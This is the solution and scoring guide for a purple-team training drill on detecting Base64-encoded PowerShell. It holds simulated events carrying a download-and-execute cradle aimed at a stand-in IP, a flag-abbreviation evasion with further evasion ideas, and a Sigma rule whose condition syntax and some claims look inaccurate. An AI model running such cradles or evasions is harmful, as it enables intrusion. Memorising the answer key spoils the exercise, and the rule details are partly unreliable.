# Solution: Purple Team Exercise — ATT&CK Technique Execution and Detection Validation

**Drill:** Advanced Drill 01 — Purple Team

**Session:** 13 — Advanced Topics in Security Operations

---

## Task 1 — Baseline Results

```console
python3 /scripts/rule_tester.py \
  --rule /data/rules/detect_encoded_powershell.yml \
  --events /data/baseline_events.json
```

**Expected output:** 0 matches (the baseline contains only legitimate process events: `explorer.exe`, `svchost.exe`, `chrome.exe`, `notepad.exe`, and similar non-PowerShell processes).

If a baseline event fires, it is because an IT automation script legitimately uses `-EncodedCommand` (e.g., a ConfigMgr agent or SCCM task).
Document it as a known false positive and add a filter in Task 4.

---

## Task 2 — Variant A Attack Simulation

```python
# /tmp/attack_variant_a.py
import json

attack_event = {
    "EventID": 4688,
    "TimeCreated": "2024-11-15T14:22:03Z",
    "Hostname": "WS-POLARIS-031",
    "User": "POLARIS\\operator1",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBwAGEAeQBsAG8AYQBkACcAKQA=",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c powershell.exe ...",
    "ProcessId": 9912,
    "ParentProcessId": 7744
}

with open("/tmp/attack_events_a.json", "w") as f:
    json.dump([attack_event], f, indent=2)
print("Written: /tmp/attack_events_a.json")
```

**Decoded Base64 payload:**

```python
import base64
encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBwAGEAeQBsAG8AYQBkACcAKQA="
print(base64.b64decode(encoded).decode("utf-16-le"))
# Output: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/payload')
```

Rule tester output for Variant A:

```text
MATCH: WS-POLARIS-031 | POLARIS\operator1 | powershell.exe | PowerShell Encoded Command Execution
Total matches: 1
```

---

## Task 3 — Variant B Evasion Demonstration

```python
# /tmp/attack_variant_b.py
import json

attack_event_b = {
    "EventID": 4688,
    "TimeCreated": "2024-11-15T14:35:17Z",
    "Hostname": "WS-POLARIS-031",
    "User": "POLARIS\\operator1",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell  -nop -w hidden -eC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBwAGEAeQBsAG8AYQBkACcAKQA=",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ProcessId": 9955,
    "ParentProcessId": 7744
}

with open("/tmp/attack_events_b.json", "w") as f:
    json.dump([attack_event_b], f, indent=2)
print("Written: /tmp/attack_events_b.json")
```

Running original rule against Variant B:

```text
Total matches: 0
```

**Why it evades:**
The original rule only checks for `-EncodedCommand` and `-enc `.
The Variant B uses `-eC` (a valid PowerShell abbreviation).
PowerShell allows any unambiguous prefix of a parameter name, so `-e`, `-eC`, `-enc`, `-enco`, etc. all work identically.
The original rule's `contains` list is incomplete.

---

## Task 4 — Improved Detection Rule

```yaml
# /tmp/detect_encoded_powershell_v2.yml
title: PowerShell Encoded Command Execution (Improved)
id: c3d4e5f6-a7b8-9012-cdef-123456789013
status: experimental
description: >
  Detects PowerShell execution with Base64 encoded commands, including all
  valid abbreviations of the -EncodedCommand parameter. Version 2 adds coverage
  for abbreviated flags (-e, -ec, -eC, etc.) used for evasion.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-parameter-sets
author: SOC Detection Team
date: 2024/11/15
modified: 2024/11/15
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
logsource:
  category: process_creation
  product: windows
detection:
  selection_image:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  # All valid abbreviations of -EncodedCommand plus the full flag
  # PowerShell uses prefix matching, so -e, -ec, -eC, -enc, etc. all work
  selection_encoded_flag:
    CommandLine|contains|any:
      - ' -EncodedCommand '
      - ' -encodedcommand '
      - ' -encodedC '
      - ' -encode '
      - ' -encoded '
      - ' -enco '
      - ' -enc '
      - ' -en '
      - ' -eC '
      - ' -ec '
      - ' -e '
  # Alternative: detect long Base64 blobs (catches cases without explicit flag)
  selection_base64_blob:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
    CommandLine|re: ' [A-Za-z0-9+/]{40,}={0,2}(\s|$)'
  # Filter known legitimate uses
  filter_sccm:
    ParentImage|contains:
      - 'CCMExec'
      - 'CcmExec.exe'
  condition: (selection_image and selection_encoded_flag) or selection_base64_blob | not filter_sccm
falsepositives:
  - SCCM/ConfigMgr agent (filtered above)
  - PowerShell DSC configurations during provisioning
  - IT automation frameworks with legitimate encoded commands
level: high
```

**Test all three event sets:**

Baseline → 0 matches (SCCM filtered; no PowerShell in baseline)
Variant A → 1 match (`-EncodedCommand` in `selection_encoded_flag`)
Variant B → 1 match (`-eC` in `selection_encoded_flag`)

---

## Task 5 — Purple Team Finding Report

```markdown
# Purple Team Finding — T1059.001 PowerShell Encoded Command

**Date:** 2024-11-15
**Technique:** T1059.001 — Command and Scripting Interpreter: PowerShell
**Testers:** SOC Detection Team (Blue) + Simulated Red Team
**Environment:** Polaris Defense Systems — Pre-Production Lab

---

## 1. Technique Tested

- **ATT&CK ID:** T1059.001
- **Name:** Command and Scripting Interpreter: PowerShell
- **Sub-technique:** Encoded Command Execution
- **Objective:** Verify detection coverage for PowerShell encoded command execution and identify evasion variants

---

## 2. Simulation Details

**Variant A — Standard technique:**
```

powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <base64>

```text
Decoded payload: `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/payload')`

**Variant B — Abbreviated flag evasion:**
```

powershell  -nop -w hidden -eC <base64>

```text
Same payload, same effect, but uses `-eC` instead of `-EncodedCommand`.

---

## 3. Initial Detection Results

| Variant | Original Rule Fires? |
|---------|---------------------|
| Variant A (standard) | YES |
| Variant B (abbreviated) | NO — detection gap |

---

## 4. Detection Gap Analysis

The original rule checked for `-EncodedCommand` and `-enc ` only. PowerShell's parameter binding accepts any unambiguous prefix of a parameter name. Since no other PowerShell parameter begins with `-e`, even a single `-e ` is valid. The original rule missed 14 valid abbreviations of the flag.

---

## 5. Improved Rule

[See /tmp/detect_encoded_powershell_v2.yml — full YAML above]

Key improvements:
- Added all common abbreviations to `CommandLine|contains|any`
- Added a secondary detection based on long Base64 blob regex (catches flagless encoding tricks)
- Added SCCM filter to reduce known false positives

---

## 6. Validation Results

| Rule Version | Baseline (50 events) | Variant A | Variant B |
|-------------|---------------------|-----------|-----------|
| v1 (original) | 0 matches | MATCH | NO MATCH |
| v2 (improved) | 0 matches | MATCH | MATCH |

---

## 7. Residual Risk

The following variants could still evade even the improved rule:

1. **Pipe-based execution:** `cmd.exe /c "echo IEX... | powershell"` — no `-EncodedCommand` flag, payload too short to trigger blob regex

2. **Environment variable staging:** `$env:payload = 'IEX...'; powershell $env:payload` — encoded content in env var, not command line
3. **CLIXML download cradles:** Using `[Convert]::FromBase64String()` inside a plaintext command — no flag, no obvious blob

---

## 8. Recommendations

1. **Deploy v2 rule immediately** — The original rule misses a significant subset of real-world PowerShell encoded command usage.

2. **Enable PowerShell Script Block Logging (Event ID 4104)** — Script block logging captures the decoded content before execution, providing the ground truth regardless of how the command was launched.
3. **Implement PowerShell Constrained Language Mode** — Prevents many download cradle patterns from executing in the first place, reducing the attack surface independent of detection.
```

---

## Common Mistakes

1. **Adding case-insensitive variants manually** — Most Sigma backends are case-insensitive. You don't need to add both `-eC` and `-EC`; just `-eC` is sufficient if the backend normalises.
1. **Overly broad `-e ` catch** — The string ` -e ` could match other processes (e.g., a Python script called with `-e` flag). Scope the condition to PowerShell image first.
1. **Not testing the filter** — If you add a filter, you must test it against baseline events that *would* have matched without the filter to confirm it works.
1. **Missing the residual risk section** — A purple team report that only says "fixed!" without documenting what still evades provides false confidence to stakeholders.

---

## Scoring Guide

| Criterion | Full marks if... |
|-----------|-----------------|
| Task 1 (10 pts) | Baseline run complete; false positive count recorded; any hits explained |
| Task 2 (15 pts) | Event A generated; rule fires; base64 decoded correctly |
| Task 3 (20 pts) | Event B generated; original rule does NOT fire; gap documented with explanation |
| Task 4 (25 pts) | v2 rule catches both A and B; passes baseline; YAML is valid |
| Task 5 (30 pts) | Report has all 8 sections; validation table correct; ≥3 residual risks; ≥3 specific recommendations |
